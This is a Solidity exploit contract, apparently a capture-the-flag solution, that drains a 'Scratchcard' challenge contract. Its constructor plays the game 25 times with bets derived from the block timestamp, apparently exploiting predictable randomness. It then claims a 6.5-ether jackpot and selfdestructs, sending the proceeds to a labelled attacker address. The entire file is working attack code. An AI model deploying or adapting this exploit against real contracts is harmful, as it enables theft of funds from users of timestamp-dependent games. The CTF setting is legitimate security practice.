pragma solidity 0.4.24;
//Challenge Address 0x505d51adcccb62cd33579c1ea7b94a717f7ae06e
//Attacker Address 0x43065950E0185BD74361D8580Daaa5BFF806aaDE
import "./Scratchcard.sol";


contract exp{
    constructor() public payable{
      Scratchcard target = address(0x505D51AdcCcB62Cd33579C1EA7B94a717F7aE06e);
        for (uint i=0; i<25; i++) {
            target.play.value((now%10**8)*10**10)();
        }
        target.collectMegaJackpot(6.5 ether);
        selfdestruct(address(0x43065950E0185BD74361D8580Daaa5BFF806aaDE));
    }
    function() public payable{}

}
